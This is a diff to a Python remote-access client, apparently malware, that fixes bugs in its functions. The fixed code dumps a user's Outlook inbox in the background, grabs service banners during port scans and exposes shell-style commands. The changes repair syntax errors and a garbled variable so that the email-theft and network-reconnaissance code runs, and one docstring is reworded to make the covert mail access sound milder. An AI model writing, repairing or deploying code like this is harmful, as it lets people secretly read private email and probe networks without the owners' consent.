@@ -670,7 +670,7 @@ class Client(object):
             outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = inbox.Items
-            return "\n\tEmails in Outlook inbox: %d\n\tEmails dumped from Outlook inbox: %d" % (len(emailsAFEGDV), len(self.email.inbox))
+            return "\n\tEmails in Outlook inbox: %d\n\tEmails dumped from Outlook inbox: %d" % (len(emails), len(self.email.inbox))
         except Exception as e:
             self.debug("{} error: {}".format(self._email_search.func_name, str(e)))
 
@@ -754,10 +754,10 @@ class Client(object):
             data = sock.recv(1024)
             if data:
                 data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
-                data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...'
+                data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...')
                 info = {port: {'protocol': Client._ports[port]['protocol'], 'service': data, 'state': 'open'}}
             else:
-                info = {port: {'protocol': Client._ports[port]['protocol'], 'service': Client._ports.[port]['service'], 'state': 'open'}}
+                info = {port: {'protocol': Client._ports[port]['protocol'], 'service': Client._ports[port]['service'], 'state': 'open'}}
             self._network.get(host).update(info)
         except (socket.error, socket.timeout):
             pass
@@ -1682,10 +1682,6 @@ class Client(object):
 
 
 
-    # Public Methods
-
-
-
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
         """
@@ -2008,7 +2004,7 @@ class Client(object):
     @config(platforms=['win32','darwin'], inbox={}, command=True, usage='email <option>')
     def email(self, args=None):
         """
-        access user's Outlook email in the background
+        access Outlook email without opening application
         """       
         if not args:
             try:
